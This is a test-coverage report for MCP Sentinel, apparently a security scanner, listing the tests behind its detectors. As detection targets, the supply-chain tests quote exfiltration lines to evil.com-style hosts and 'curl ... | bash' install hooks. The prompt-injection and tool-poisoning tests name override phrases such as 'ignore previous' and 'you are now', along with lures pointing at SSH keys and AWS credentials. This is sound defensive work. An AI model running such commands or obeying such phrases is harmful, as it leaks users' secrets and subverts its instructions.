# MCP Sentinel v0.4.0 — Test Coverage

**Total: 502 passed, 4 xfailed (documented), 0 failed**
**Python:** 3.9, 3.10, 3.11, 3.12
**Last run:** 2026-03-23

---

## Summary by Module

| Test File | Tests | Status | What It Covers |
|---|---|---|---|
| `tests/unit/test_insecure_deserialization.py` | 45 | 45 pass | InsecureDeserializationDetector — new in v0.4.0 |
| `tests/unit/test_weak_crypto.py` | 48 | 48 pass | WeakCryptoDetector — new in v0.4.0 |
| `tests/unit/test_supply_chain.py` | 75 | 75 pass | SupplyChainDetector — new in v0.3.0 |
| `tests/unit/test_ssrf_detector.py` | 25 | 25 pass | SSRFDetector — new in v0.2.0 |
| `tests/unit/test_network_binding.py` | 22 | 22 pass | NetworkBindingDetector — new in v0.2.0 |
| `tests/unit/test_missing_auth.py` | 19 | 19 pass | MissingAuthDetector — new in v0.2.0 |
| `tests/unit/test_tool_poisoning_enhanced.py` | 20 | 20 pass | Full-schema poisoning — new in v0.2.0 |
| `tests/unit/test_tool_poisoning.py` | 38 | 38 pass | ToolPoisoningDetector core patterns |
| `tests/unit/test_prompt_injection.py` | 41 | 41 pass | PromptInjectionDetector |
| `tests/unit/test_path_traversal.py` | 42 | 38 pass, 4 xfail | PathTraversalDetector |
| `tests/unit/test_config_security.py` | 51 | 51 pass | ConfigSecurityDetector |
| `tests/unit/test_code_injection.py` | 34 | 34 pass | CodeInjectionDetector |
| `tests/unit/test_secrets_detector.py` | 8 | 8 pass | SecretsDetector |
| `tests/unit/test_multi_engine_scanner.py` | 11 | 11 pass | MultiEngineScanner orchestration |
| `tests/unit/test_static_engine.py` | 6 | 6 pass | StaticAnalysisEngine |
| `tests/unit/test_cli_enhanced.py` | 4 | 4 pass | CLI interface |
| `tests/unit/test_framework_detection.py` | 3 | 3 pass | Framework detection helpers |
| `tests/unit/test_logger.py` | 3 | 3 pass | Logging subsystem |
| `tests/unit/core/test_config.py` | 5 | 5 pass | Configuration/settings |
| `tests/integration/test_scanner.py` | 7 | 7 pass | End-to-end scan pipeline |
| `tests/test_caching.py` | 1 | 1 pass | MD5-based file cache |

---

## v0.4.0 New Detector Tests

### WeakCryptoDetector (48 tests)

| Test | What It Verifies |
|---|---|
| `test_detector_name` | `detector.name == "WeakCryptoDetector"` |
| `test_detector_enabled_by_default` | `detector.enabled is True` |
| `test_applicable_python` | `.py` in scope |
| `test_applicable_javascript` | `.js` in scope |
| `test_applicable_typescript` | `.ts` in scope |
| `test_applicable_java` | `.java` in scope |
| `test_applicable_go` | `.go` in scope |
| `test_not_applicable_yaml` | `.yaml` excluded |
| `test_not_applicable_markdown` | `.md` excluded |
| `test_not_applicable_json` | `.json` excluded |
| `test_detect_hashlib_md5` | `hashlib.md5()` → HIGH |
| `test_detect_hashlib_sha1` | `hashlib.sha1()` → HIGH |
| `test_detect_crypto_create_hash_md5` | `crypto.createHash('md5')` → HIGH |
| `test_detect_crypto_create_hash_sha1` | `crypto.createHash('sha1')` → HIGH |
| `test_detect_java_message_digest_md5` | `MessageDigest.getInstance("MD5")` → HIGH |
| `test_detect_java_message_digest_sha1` | `MessageDigest.getInstance("SHA-1")` → HIGH |
| `test_broken_hash_severity_is_high` | broken_hash severity == "high" |
| `test_no_false_positive_md5_for_checksum` | `checksum = hashlib.md5(data).hexdigest()` suppressed |
| `test_no_false_positive_md5_for_etag` | `etag = hashlib.md5(content).hexdigest()` suppressed |
| `test_detect_random_random` | `random.random()` → HIGH |
| `test_detect_random_randint` | `random.randint(...)` → HIGH |
| `test_detect_random_choice_token` | `random.choice(...)` for tokens → HIGH |
| `test_detect_math_random_js` | `Math.random()` → HIGH |
| `test_insecure_random_severity_is_high` | insecure_random severity == "high" |
| `test_no_false_positive_import_random` | `import random` alone not flagged |
| `test_detect_aes_mode_ecb` | `AES.new(key, AES.MODE_ECB)` → HIGH |
| `test_detect_mode_ecb_constant` | `Cipher.getInstance("AES/ECB/PKCS5Padding")` → HIGH |
| `test_detect_createcipheriv_ecb` | `createCipheriv("aes-128-ecb", ...)` → HIGH |
| `test_ecb_severity_is_high` | ecb_mode severity == "high" |
| `test_detect_des_new` | `DES.new(key)` → HIGH |
| `test_detect_rc4` | `ARC4.new(key)` → HIGH |
| `test_detect_java_des` | `Cipher.getInstance("DES/...")` → HIGH |
| `test_detect_createcipheriv_rc4` | `createCipheriv("rc4", ...)` → HIGH |
| `test_deprecated_cipher_severity_is_high` | deprecated_cipher severity == "high" |
| `test_detect_static_iv_zeros` | `iv = b'\x00' * 16` → HIGH |
| `test_detect_hardcoded_iv_hex_string` | `nonce = bytes.fromhex("0000000000000000")` → HIGH |
| `test_detect_pbkdf2_low_iterations` | `pbkdf2_hmac(..., iterations=1000)` → MEDIUM |
| `test_weak_kdf_severity_is_medium` | weak_kdf severity == "medium" |
| `test_no_false_positive_comment_line` | Commented-out hash calls not flagged |
| `test_no_false_positive_test_word` | Lines with `test` suppressed |
| `test_empty_file` | Empty file produces no findings |
| `test_vulnerability_has_cwe` | All findings have a `cwe_id` |
| `test_vulnerability_has_remediation` | All findings have non-empty `remediation` |
| `test_vulnerability_has_references` | All findings have references |
| `test_vulnerability_detector_field` | `v.detector == "WeakCryptoDetector"` |
| `test_vulnerability_engine_field` | `v.engine == "static"` |
| `test_line_number_accuracy` | Line number points to the flagged line |
| `test_code_snippet_captured` | Code snippet contains the matched expression |

### InsecureDeserializationDetector (45 tests)

| Test | What It Verifies |
|---|---|
| `test_detector_name` | `detector.name == "InsecureDeserializationDetector"` |
| `test_detector_enabled_by_default` | `detector.enabled is True` |
| `test_applicable_python` | `.py` in scope |
| `test_applicable_javascript` | `.js` in scope |
| `test_applicable_typescript` | `.ts` in scope |
| `test_applicable_java` | `.java` in scope |
| `test_applicable_php` | `.php` in scope |
| `test_not_applicable_go` | `.go` excluded |
| `test_not_applicable_yaml` | `.yaml` excluded |
| `test_not_applicable_markdown` | `.md` excluded |
| `test_detect_pickle_loads` | `pickle.loads(data)` → CRITICAL |
| `test_detect_pickle_load_file` | `pickle.load(f)` → CRITICAL |
| `test_detect_cpickle_loads` | `cPickle.loads(data)` → CRITICAL |
| `test_pickle_line_number_accuracy` | Line number points to the `pickle.loads` line |
| `test_pickle_code_snippet_captured` | Code snippet contains `pickle` |
| `test_detect_yaml_load_no_loader` | `yaml.load(data)` with no Loader → CRITICAL |
| `test_detect_yaml_load_full_loader` | `yaml.load(data, Loader=yaml.FullLoader)` → CRITICAL |
| `test_no_false_positive_yaml_safe_load_function` | `yaml.safe_load(data)` not flagged |
| `test_no_false_positive_yaml_safeloader_arg` | `yaml.load(data, Loader=yaml.SafeLoader)` not flagged |
| `test_detect_marshal_loads` | `marshal.loads(data)` → CRITICAL |
| `test_detect_marshal_load` | `marshal.load(f)` → CRITICAL |
| `test_detect_eval_on_request_data` | `eval(request.body)` → CRITICAL |
| `test_detect_eval_on_body` | `eval(data)` → CRITICAL |
| `test_no_false_positive_eval_string_literal` | `eval("1 + 1")` not flagged |
| `test_detect_jsonpickle_decode` | `jsonpickle.decode(data)` → CRITICAL |
| `test_detect_java_object_input_stream` | `new ObjectInputStream(...)` → CRITICAL |
| `test_detect_java_read_object` | `.readObject()` → CRITICAL |
| `test_detect_xstream` | `new XStream()` → CRITICAL |
| `test_java_object_stream_not_flagged_in_python` | Java patterns don't fire on `.py` files |
| `test_detect_php_unserialize` | `unserialize($_POST[...])` → CRITICAL |
| `test_php_unserialize_not_flagged_in_python` | PHP patterns don't fire on `.py` files |
| `test_detect_vm_run_in_context` | `vm.runInContext(code, ctx)` → CRITICAL |
| `test_detect_vm_run_in_new_context` | `vm.runInNewContext(code, sandbox)` → CRITICAL |
| `test_detect_node_eval_body` | `eval(req.body)` in Node.js → CRITICAL |
| `test_no_false_positive_comment` | Commented-out deserialization calls not flagged |
| `test_no_false_positive_test_context` | Lines with standalone `test` suppressed |
| `test_empty_file` | Empty file produces no findings |
| `test_shelve_hardcoded_path_suppressed` | `shelve.open("fixed_path.db")` not flagged |
| `test_vulnerability_type_is_insecure_deserialization` | `v.vuln_type == VulnerabilityType.INSECURE_DESERIALIZATION` |
| `test_vulnerability_has_cwe` | All findings have a `cwe_id` |
| `test_vulnerability_has_remediation` | All findings have non-empty `remediation` |
| `test_vulnerability_has_references` | All findings have references |
| `test_vulnerability_has_mitre_attack` | All findings have `mitre_attack_ids` |
| `test_vulnerability_detector_field` | `v.detector == "InsecureDeserializationDetector"` |
| `test_vulnerability_engine_field` | `v.engine == "static"` |

---

## v0.3.0 New Detector Tests

### SupplyChainDetector (75 tests)

| Test | What It Verifies |
|---|---|
| `test_detector_name` | `detector.name == "SupplyChainDetector"` |
| `test_detector_enabled_by_default` | `detector.enabled is True` |
| `test_applicable_to_python` | `.py` in scope |
| `test_applicable_to_javascript` | `.js` in scope |
| `test_applicable_to_typescript` | `.ts` in scope |
| `test_applicable_to_shell` | `.sh` in scope |
| `test_applicable_to_setup_py` | `setup.py` always in scope |
| `test_applicable_to_package_json` | `package.json` always in scope |
| `test_applicable_to_requirements_txt` | `requirements.txt` always in scope |
| `test_applicable_to_pyproject_toml` | `pyproject.toml` always in scope |
| `test_applicable_to_npmrc` | `.npmrc` always in scope |
| `test_not_applicable_to_markdown` | `.md` excluded |
| `test_not_applicable_to_image` | `.png` excluded |
| `test_detect_eval_base64_python` | `eval(base64.b64decode(...))` → CRITICAL |
| `test_detect_exec_base64_python` | `exec(base64.b64decode(...))` → CRITICAL |
| `test_detect_eval_atob_javascript` | `eval(atob(...))` → CRITICAL |
| `test_detect_eval_buffer_base64` | `eval(Buffer.from(data,'base64').toString(...))` → CRITICAL |
| `test_detect_zlib_decompress_base64` | `exec(zlib.decompress(base64.b64decode(...)))` → CRITICAL |
| `test_encoded_payload_line_number_accuracy` | Line number points to the `eval(...)` line |
| `test_encoded_payload_code_snippet_captured` | Code snippet contains `base64` |
| `test_detect_setup_py_cmdclass` | `cmdclass={'install': CustomInstall}` with shell call in setup.py → HIGH |
| `test_detect_npm_postinstall_hook` | `"postinstall": "curl ... \| bash"` in package.json → HIGH |
| `test_detect_subprocess_curl_in_setup` | `subprocess.call(['curl', ...])` in setup.py → HIGH |
| `test_no_false_positive_npm_build_hook` | `"postinstall": "node ./scripts/build.js"` not flagged |
| `test_detect_requests_in_setup_py` | `requests.post(...)` inside setup.py → CRITICAL |
| `test_detect_urllib_in_setup_py` | `urllib.request.urlopen(...)` inside setup.py → CRITICAL |
| `test_no_network_call_outside_setup_py` | `requests.get(...)` in server.py not flagged as install-time |
| `test_detect_requests_post_with_os_environ` | `requests.post(..., data=os.environ)` → CRITICAL |
| `test_detect_fetch_with_process_env` | `fetch('...', {body: JSON.stringify(process.env)})` → CRITICAL |
| `test_detect_dns_exfiltration` | `socket.gethostbyname(b64encode(os.environ[...]) + '.evil.com')` → CRITICAL |
| `test_exfiltration_remediation_contains_rotate` | Remediation text advises rotating credentials |
| `test_detect_bcc_hardcoded_python` | `msg["Bcc"] = "attacker@evil.com"` → HIGH |
| `test_detect_bcc_in_dict_assignment` | `{'bcc': 'spy@attacker.com', ...}` → HIGH |
| `test_detect_forward_to_hardcoded` | `forward_to = 'data-collector@evil.com'` → HIGH |
| `test_no_false_positive_bcc_comment` | `# BCC: ...` comment not flagged |
| `test_detect_extra_index_url_unknown` | `--extra-index-url https://packages.internal-corp.example/` → MEDIUM |
| `test_detect_npm_registry_override` | `registry=https://npm.internal.attacker.com/` in .npmrc → MEDIUM |
| `test_no_false_positive_official_pypi` | `--index-url https://pypi.org/simple/` not flagged |
| `test_no_false_positive_official_npm_registry` | `registry=https://registry.npmjs.org/` not flagged |
| `test_detect_colourama_typosquat` | `import colourama` → HIGH |
| `test_detect_crossenv_typosquat` | `require("crossenv")` → HIGH |
| `test_typosquat_references_not_empty` | Typosquat findings include reference URLs |
| `test_no_false_positive_test_file` | Lines containing `test` are suppressed |
| `test_no_false_positive_example_comment` | Comment lines not flagged |
| `test_vulnerability_has_cwe` | All findings have a `cwe_id` |
| `test_vulnerability_has_mitre_attack` | All findings have `mitre_attack_ids` |
| `test_vulnerability_has_remediation` | All findings have non-empty `remediation` |
| `test_vulnerability_detector_field` | `v.detector == "SupplyChainDetector"` |
| `test_vulnerability_engine_field` | `v.engine == "static"` |
| `test_detect_urlsafe_b64decode` | `eval(base64.urlsafe_b64decode(...))` → CRITICAL |
| `test_detect_codecs_decode` | `eval(codecs.decode(..., 'base64'))` → CRITICAL |
| `test_detect_marshal_loads_base64` | `marshal.loads(base64.b64decode(...))` → CRITICAL |
| `test_detect_exec_compile_base64` | `exec(compile(base64.b64decode(...), ...))` → CRITICAL |
| `test_detect_bcc_add_header` | `msg.add_header('Bcc', 'spy@...')` → HIGH |
| `test_detect_npm_preinstall_hook` | `"preinstall": "curl ... \| bash"` → HIGH |
| `test_detect_index_url_config_override` | `index-url = https://my.private-registry.io/` in pip.conf → MEDIUM |
| `test_detect_npm_registry_json_field` | `"registry": "https://npm.attacker-corp.io/"` → MEDIUM |
| `test_detect_fetch_with_readfile` | `fetch(url, {body: fs.readFileSync(...)})` → CRITICAL |
| `test_detect_urllib_in_setup_py` | `urllib.request.urlopen(...)` in setup.py → CRITICAL |
| `test_no_false_positive_base64_decode_without_eval` | `base64.b64decode(...)` alone not flagged |
| `test_no_false_positive_pypi_index_url` | `--index-url https://pypi.org/simple/` not flagged |
| `test_no_false_positive_pythonhosted` | `--extra-index-url https://files.pythonhosted.org/` not flagged |
| `test_encoded_payload_severity_is_critical` | Encoded payload severity == CRITICAL |
| `test_install_script_network_severity_is_critical` | Network call in setup.py == CRITICAL |
| `test_covert_exfiltration_severity_is_critical` | Exfiltration severity == CRITICAL |
| `test_typosquat_mongose` | `require("mongose")` → HIGH |
| `test_typosquat_reqests` | `import reqests` → HIGH |
| `test_multiple_categories_same_file` | Multiple categories detected in one file |
| `test_empty_file` | Empty file produces no findings |
| `test_blank_lines_only` | Blank-only content produces no findings |
| `test_comment_only_file` | Comment-only content produces no findings |
| `test_applicable_to_bash_extension` | `.bash` in scope |
| `test_applicable_to_jsx` | `.jsx` in scope |
| `test_applicable_to_tsx` | `.tsx` in scope |
| `test_applicable_to_setup_cfg` | `setup.cfg` in scope |
| `test_applicable_to_pipfile` | `Pipfile` in scope |

---

## v0.2.0 New Detector Tests

### SSRFDetector (25 tests)

| Test | What It Verifies |
|---|---|
| `test_detect_requests_get_variable` | Python `requests.get(variable)` → HIGH |
| `test_detect_requests_post_variable` | Python `requests.post(variable)` → HIGH |
| `test_detect_httpx_get_variable` | Python `httpx.get(variable)` → HIGH |
| `test_detect_urllib_urlopen_variable` | Python `urllib.request.urlopen(variable)` → HIGH |
| `test_detect_aiohttp_get_variable` | Python `aiohttp.ClientSession().get(variable)` → HIGH |
| `test_detect_fetch_variable` | JavaScript `fetch(variable)` → HIGH |
| `test_detect_axios_get_variable` | JavaScript `axios.get(variable)` → HIGH |
| `test_detect_aws_imds` | AWS metadata URL `169.254.169.254` → CRITICAL |
| `test_detect_gcp_metadata` | GCP metadata `metadata.google.internal` → CRITICAL |
| `test_detect_ecs_metadata` | ECS metadata `169.254.170.2` → CRITICAL |
| `test_detect_redirect_uri_param` | `redirect_uri` parameter → MEDIUM |
| `test_detect_webhook_url_param` | `webhook_url` parameter → MEDIUM |
| `test_detect_go_http_get_variable` | Go `http.Get(variable)` → HIGH |
| `test_detect_go_http_new_request` | Go `http.NewRequest("GET", variable, ...)` → HIGH |
| `test_detect_java_url_open` | Java `new URL(variable).openConnection()` → HIGH |
| `test_no_false_positive_literal_url` | Literal strings (`"https://api.example.com"`) not flagged |
| `test_no_false_positive_comment` | Commented-out code not flagged |
| `test_no_false_positive_fetch_literal` | `fetch("https://...")` with literal URL not flagged |
| `test_applicable_python` | `.py` files in scope |
| `test_applicable_javascript` | `.js` files in scope |
| `test_applicable_typescript` | `.ts` files in scope |
| `test_applicable_go` | `.go` files in scope |
| `test_applicable_java` | `.java` files in scope |
| `test_not_applicable_yaml` | `.yaml` files excluded |
| `test_not_applicable_markdown` | `.md` files excluded |

### NetworkBindingDetector (22 tests)

| Test | What It Verifies |
|---|---|
| `test_detect_flask_app_run_wildcard` | `app.run(host="0.0.0.0")` → MEDIUM |
| `test_detect_uvicorn_run_wildcard` | `uvicorn.run(..., host="0.0.0.0")` → MEDIUM |
| `test_detect_host_kwarg_wildcard` | `host="0.0.0.0"` keyword arg → MEDIUM |
| `test_detect_express_listen_wildcard` | Express `listen(port, "0.0.0.0")` → MEDIUM |
| `test_detect_hostname_wildcard` | `hostname: "0.0.0.0"` in config → MEDIUM |
| `test_detect_go_net_listen_explicit_wildcard` | Go `net.Listen("tcp", "0.0.0.0:8080")` → MEDIUM |
| `test_detect_go_net_listen_shorthand` | Go `net.Listen("tcp", ":8080")` (implicit wildcard) → MEDIUM |
| `test_detect_go_listen_and_serve_shorthand` | Go `http.ListenAndServe(":8080", ...)` → MEDIUM |
| `test_go_shorthand_note_in_description` | Go `:port` shorthand explains the implicit 0.0.0.0 binding |
| `test_detect_env_bind_host` | `BIND_HOST=0.0.0.0` in `.env` → MEDIUM |
| `test_detect_env_host` | `HOST=0.0.0.0` in `.env` → MEDIUM |
| `test_detect_yaml_bind_address` | `bind_address: 0.0.0.0` in YAML → MEDIUM |
| `test_no_false_positive_localhost` | `host="127.0.0.1"` not flagged |
| `test_no_false_positive_specific_ip` | `host="192.168.1.1"` not flagged |
| `test_no_false_positive_comment` | Commented-out code not flagged |
| `test_remediation_mentions_localhost` | Remediation text advises `127.0.0.1` |
| `test_applicable_python` | `.py` in scope |
| `test_applicable_go` | `.go` in scope |
| `test_applicable_env` | `.env` in scope |
| `test_applicable_yaml` | `.yaml` in scope |
| `test_applicable_javascript` | `.js` in scope |
| `test_not_applicable_markdown` | `.md` excluded |

### MissingAuthDetector (19 tests)

| Test | What It Verifies |
|---|---|
| `test_detect_flask_route_no_auth` | `@app.route("/admin")` with no auth decorator → HIGH |
| `test_detect_flask_admin_route_no_auth` | `/admin/*` path flagged → HIGH |
| `test_flask_route_with_login_required_suppressed` | `@login_required` suppresses finding |
| `test_flask_route_with_auth_required_suppressed` | `@auth_required` suppresses finding |
| `test_detect_fastapi_router_no_auth` | `@router.get("/internal")` with no Depends → HIGH |
| `test_fastapi_route_with_depends_suppressed` | `Depends(auth)` suppresses finding |
| `test_fastapi_debug_route_no_auth` | `/debug` route without auth → HIGH |
| `test_detect_express_route_no_auth` | `app.get("/admin", ...)` → HIGH |
| `test_express_admin_route_no_auth` | Express admin route → HIGH |
| `test_express_route_with_auth_middleware_suppressed` | `authenticate` middleware suppresses finding |
| `test_detect_mcp_tool_exec_no_auth` | MCP tool named `exec_*` without auth → HIGH |
| `test_detect_mcp_tool_system_no_auth` | MCP tool named `execute_system_command` → HIGH |
| `test_sensitive_internal_path_flagged` | `/internal/`, `/system/` paths flagged |
| `test_applicable_python` | `.py` in scope |
| `test_applicable_javascript` | `.js` in scope |
| `test_applicable_typescript` | `.ts` in scope |
| `test_applicable_json` | `.json` in scope (MCP tool schemas) |
| `test_not_applicable_go` | `.go` excluded |
| `test_not_applicable_yaml` | `.yaml` excluded |

### ToolPoisoningDetector — Enhanced (20 tests)

| Test | What It Verifies |
|---|---|
| `test_detect_always_run_first_tool_name` | Tool named `always_run_first` → HIGH |
| `test_detect_override_prefix_tool_name` | Tool named `override_*` → HIGH |
| `test_detect_hijack_tool_name` | Tool named `hijack_*` → HIGH |
| `test_detect_instruction_param_name` | Parameter named `__instruction__` → HIGH |
| `test_detect_system_prompt_param_name` | Parameter named `system_prompt` → HIGH |
| `test_detect_ai_directive_param_name` | Parameter named `ai_directive` → HIGH |
| `test_detect_before_calling_phrase` | "before calling tool X" in description → HIGH |
| `test_detect_always_call_this_tool_first` | "always call this tool first" → HIGH |
| `test_detect_global_rule_phrase` | "global rule:" in description → HIGH |
| `test_detect_applies_to_all_tools` | "this applies to all tools" → HIGH |
| `test_detect_this_tool_takes_precedence` | "this tool takes precedence" → HIGH |
| `test_detect_env_file_in_description_critical` | `.env` referenced in description → CRITICAL |
| `test_detect_ssh_key_in_description_critical` | `.ssh/id_rsa` referenced → CRITICAL |
| `test_detect_aws_credentials_critical` | `~/.aws/credentials` referenced → CRITICAL |
| `test_detect_etc_passwd_critical` | `/etc/passwd` referenced → CRITICAL |
| `test_detect_id_rsa_critical` | `id_rsa` referenced → CRITICAL |
| `test_no_false_positive_dotenv_library` | `python-dotenv` import not flagged |
| `test_detect_anomalous_description_length_json` | Tool description >500 chars in JSON → MEDIUM |
| `test_detect_anomalous_description_length_python` | Tool description >500 chars in Python → MEDIUM |
| `test_normal_description_length_not_flagged` | Normal-length description not flagged |

---

## Existing Detector Tests

### CodeInjectionDetector (34 tests)

Detection tests: `test_detect_os_system`, `test_detect_subprocess_call_shell`, `test_detect_subprocess_run_shell`, `test_detect_subprocess_popen_shell`, `test_detect_eval_usage`, `test_detect_exec_usage`, `test_multiple_python_vulnerabilities`, `test_detect_child_process_exec`, `test_detect_javascript_eval`, `test_detect_function_constructor`, `test_child_process_require_inline`, `test_multiple_javascript_vulnerabilities`, `test_typescript_file_detection`, `test_jsx_file_detection`

False-positive suppression: `test_ignore_python_comments`, `test_ignore_javascript_comments`, `test_safe_subprocess_without_shell`, `test_safe_subprocess_shell_false`, `test_safe_ast_literal_eval`, `test_safe_json_parse`, `test_safe_execfile_spawn`

Integration/quality: `test_python_fixture_file`, `test_javascript_fixture_file`, `test_empty_file`, `test_whitespace_only`, `test_multiline_detection`, `test_line_number_accuracy`, `test_code_snippet_captured`, `test_vulnerability_metadata`, `test_is_applicable_python`, `test_is_applicable_javascript`, `test_is_applicable_other_files`, `test_detector_name`, `test_detector_enabled_by_default`

### ConfigSecurityDetector (51 tests)

Detection tests: `test_detect_debug_true_python`, `test_detect_debug_yaml`, `test_detect_node_env_development`, `test_detect_flask_debug`, `test_detect_auth_disabled`, `test_detect_weak_password`, `test_detect_allow_anonymous`, `test_detect_cors_wildcard_header`, `test_detect_cors_origins_wildcard`, `test_detect_cors_function_wildcard`, `test_detect_xframe_options_allow`, `test_detect_hsts_disabled`, `test_detect_unsafe_csp`, `test_detect_weak_secret_key`, `test_detect_insecure_cookie`, `test_detect_weak_session_secret`, `test_detect_rate_limit_disabled`, `test_detect_rate_limit_false`, `test_detect_disabled_rate_limit`, `test_detect_ssl_verify_false`, `test_detect_weak_tls_version`, `test_detect_check_hostname_false`, `test_detect_debug_endpoint`, `test_detect_admin_endpoint`, `test_detect_allowed_hosts_wildcard`

False-positive suppression: `test_ignore_python_comments`, `test_ignore_javascript_comments`, `test_ignore_test_files`, `test_ignore_local_dev_config`, `test_ignore_env_vars`, `test_ignore_nodejs_env_vars`

Integration/quality: `test_multiple_config_issues`, `test_mixed_severity_issues`, `test_empty_file`, `test_whitespace_only`, `test_line_number_accuracy`, `test_code_snippet_captured`, `test_vulnerability_metadata_debug`, `test_vulnerability_metadata_weak_auth`, `test_vulnerability_remediation_content`, `test_vulnerability_references`, `test_comprehensive_config_detection`, `test_nodejs_config_detection`, `test_is_applicable_python`, `test_is_applicable_config_files`, `test_is_applicable_javascript`, `test_is_applicable_nginx`, `test_is_applicable_docker`, `test_is_applicable_other_files`, `test_detector_name`, `test_detector_enabled_by_default`

### ToolPoisoningDetector — Core (38 tests)

Detection tests: `test_detect_zero_width_space`, `test_detect_rtl_override`, `test_detect_multiple_invisible_chars`, `test_zero_width_joiner`, `test_detect_ignore_previous`, `test_detect_disregard_prior`, `test_detect_forget_above`, `test_detect_ignore_all_previous`, `test_detect_override_previous`, `test_detect_new_instructions`, `test_detect_replace_instructions`, `test_detect_override_safety`, `test_detect_always_respond`, `test_detect_never_mention`, `test_detect_pretend_you`, `test_detect_must_always`, `test_detect_act_like`, `test_detect_html_comment_hidden`, `test_detect_hidden_bracket_marker`, `test_detect_secret_marker`, `test_detect_js_comment_hidden`

Integration/quality: `test_fixture_file_detection`, `test_multiple_vulnerabilities_same_line`, `test_line_number_accuracy`, `test_code_snippet_captured`, `test_safe_legitimate_description`, `test_safe_normal_text`, `test_detector_name`, `test_detector_enabled_by_default`, `test_vulnerability_metadata_complete`, `test_unicode_detection_critical_severity`, `test_remediation_guidance`, `test_references_included`, `test_is_applicable_json_files`, `test_is_applicable_yaml_files`, `test_is_applicable_code_files`, `test_is_applicable_text_files`, `test_is_applicable_other_files`

### PromptInjectionDetector (41 tests)

Detection tests: `test_detect_you_are_now`, `test_detect_act_as`, `test_detect_pretend_to_be`, `test_detect_from_now_on`, `test_case_insensitive_role_manipulation`, `test_detect_system_prompt`, `test_detect_system_message`, `test_detect_system_colon`, `test_detect_prompt_template`, `test_detect_role_system_json`, `test_detect_role_assistant_json`, `test_detect_role_user_json`, `test_detect_role_equals_syntax`, `test_multiple_role_assignments`, `test_detect_jailbreak_keyword`, `test_detect_dan_mode`, `test_detect_developer_mode`, `test_detect_ignore_previous`, `test_detect_ignore_prior`, `test_detect_disregard_previous`, `test_detect_forget_previous`

False-positive suppression: `test_ignore_python_comments`, `test_ignore_javascript_comments`, `test_ignore_yaml_comments`, `test_safe_legitimate_usage`, `test_safe_technical_terms`

Integration/quality: `test_multiple_vulnerabilities_same_line`, `test_fixture_file_detection`, `test_line_number_accuracy`, `test_code_snippet_captured`, `test_jailbreak_is_critical`, `test_role_manipulation_is_high`, `test_role_assignment_is_medium`, `test_detector_name`, `test_detector_enabled_by_default`, `test_vulnerability_metadata_complete`, `test_remediation_guidance`, `test_references_included`, `test_is_applicable_text_files`, `test_is_applicable_code_files`, `test_is_applicable_other_files`

### PathTraversalDetector (42 tests — 38 pass, 4 xfail)

Detection tests: `test_detect_open_with_request_param` *(xfail)*, `test_detect_readfile_with_params`, `test_detect_writefile_with_user_input`, `test_detect_open_with_concatenation`, `test_detect_php_file_get_contents`, `test_detect_php_fopen`, `test_detect_dot_dot_slash`, `test_detect_dot_dot_backslash`, `test_detect_url_encoded_traversal`, `test_detect_zipfile_extract`, `test_detect_zipfile_extractall`, `test_detect_tarfile_extract`, `test_detect_os_path_join_with_request` *(xfail)*, `test_detect_nodejs_path_join`, `test_detect_java_file_constructor` *(xfail)*, `test_detect_java_paths_get`, `test_nodejs_file_handler` *(xfail)*

False-positive suppression: `test_ignore_python_comments`, `test_ignore_javascript_comments`, `test_safe_with_realpath`, `test_safe_with_normpath`, `test_safe_with_resolve`, `test_safe_zip_extraction_with_validation`, `test_ignore_test_files`

Integration/quality: `test_multiple_path_traversal_issues`, `test_empty_file`, `test_whitespace_only`, `test_line_number_accuracy`, `test_code_snippet_captured`, `test_vulnerability_metadata_path_manipulation`, `test_vulnerability_metadata_zip_slip`, `test_vulnerability_remediation_content`, `test_vulnerability_references`, `test_comprehensive_path_traversal_detection`, `test_is_applicable_python`, `test_is_applicable_javascript`, `test_is_applicable_java`, `test_is_applicable_php`, `test_is_applicable_other_languages`, `test_is_applicable_non_code_files`, `test_detector_name`, `test_detector_enabled_by_default`

**xfail reason:** Multi-line taint tracking (variable assigned on line N, used in `open()`/`os.path.join()` on line N+M) requires semantic/dataflow analysis. Tracked for v0.5.0.

### SecretsDetector (8 tests)

`test_detect_aws_access_key`, `test_detect_openai_api_key`, `test_detect_anthropic_api_key`, `test_detect_private_key`, `test_detect_database_url`, `test_ignore_placeholders`, `test_line_number_tracking`, `test_multiple_secrets_in_file`

---

## Infrastructure Tests

### MultiEngineScanner (11 tests)

`test_multi_engine_scanner_initialization`, `test_multi_engine_scanner_with_specific_engines`, `test_multi_engine_scan_directory`, `test_multi_engine_scan_file`, `test_multi_engine_progress_callback`, `test_multi_engine_deduplication`, `test_multi_engine_get_active_engines`, `test_multi_engine_get_engine_types`, `test_multi_engine_empty_directory`, `test_multi_engine_nonexistent_directory`, `test_multi_engine_file_with_content`

### StaticAnalysisEngine (6 tests)

`test_static_engine_initialization`, `test_static_engine_scan_file`, `test_static_engine_scan_directory`, `test_static_engine_progress_callback`, `test_static_engine_is_applicable`, `test_static_engine_supported_languages`

### Integration — Full Scan Pipeline (7 tests)

`test_scan_directory`, `test_scan_finds_secrets`, `test_scan_empty_directory`, `test_scan_file`, `test_scan_statistics`, `test_risk_score_calculation`, `test_get_by_severity`

### Supporting Tests

| Test | Module | What It Covers |
|---|---|---|
| `test_caching_mechanism` | `tests/test_caching.py` | MD5-based file cache, skip-on-unchanged |
| `test_cli_help` | `test_cli_enhanced.py` | `mcp-sentinel --help` output |
| `test_cli_logging_options` | `test_cli_enhanced.py` | `--log-level`, `--log-file` flags |
| `test_scan_interactive` | `test_cli_enhanced.py` | Interactive target prompt |
| `test_scan_with_target` | `test_cli_enhanced.py` | `mcp-sentinel scan <path>` |
| `test_django_detection` | `test_framework_detection.py` | Django framework fingerprinting |
| `test_flask_detection` | `test_framework_detection.py` | Flask framework fingerprinting |
| `test_json_formatter` | `test_logger.py` | JSON structured log output |
| `test_setup_logging_file` | `test_logger.py` | File log handler setup |
| `test_setup_logging_console` | `test_logger.py` | Console log handler setup |
| `test_engine_settings_defaults` | `core/test_config.py` | Default engine settings |
| `test_engine_settings_env_override` | `core/test_config.py` | Env var override of settings |
| `test_settings_defaults` | `core/test_config.py` | Global settings defaults |
| `test_settings_engines_sub_config` | `core/test_config.py` | Engine sub-configuration |
| `test_settings_env_override` | `core/test_config.py` | Settings via environment |

---

## Running the Tests

```bash
# Full suite
python -m pytest tests/ -v

# Specific detector
python -m pytest tests/unit/test_ssrf_detector.py -v

# v0.4.0 new detectors (93 tests)
python -m pytest tests/unit/test_weak_crypto.py \
                 tests/unit/test_insecure_deserialization.py -v

# v0.3.0 new detector (75 tests)
python -m pytest tests/unit/test_supply_chain.py -v

# v0.2.0 new detectors
python -m pytest tests/unit/test_ssrf_detector.py \
                 tests/unit/test_network_binding.py \
